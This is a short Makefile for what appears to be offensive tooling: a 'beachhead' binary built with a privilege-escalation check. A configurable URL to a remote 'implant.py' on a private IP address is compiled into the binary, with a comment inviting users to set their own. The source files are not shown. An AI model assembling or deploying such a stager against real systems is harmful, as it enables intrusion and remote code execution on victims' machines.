# Change this to your url
URL ?= "http://10.37.1.249/implant.py"

# Compiler and flags for c++
CXX = g++
CXXFLAGS = -O2 -s -DURL='$(URL)'

TARGET = beachhead
SRCS = beachhead.cpp privesc_check.cpp
OBJS = $(SRCS:.cpp=.o)

all: $(TARGET)

$(TARGET): $(OBJS)
	$(CXX) $(CXXFLAGS) -o $(TARGET) $(OBJS)

%.o: %.cpp
	$(CXX) $(CXXFLAGS) -c $< -o $@

clean:
	rm -f $(TARGET) $(OBJS)

.PHONY: all clean
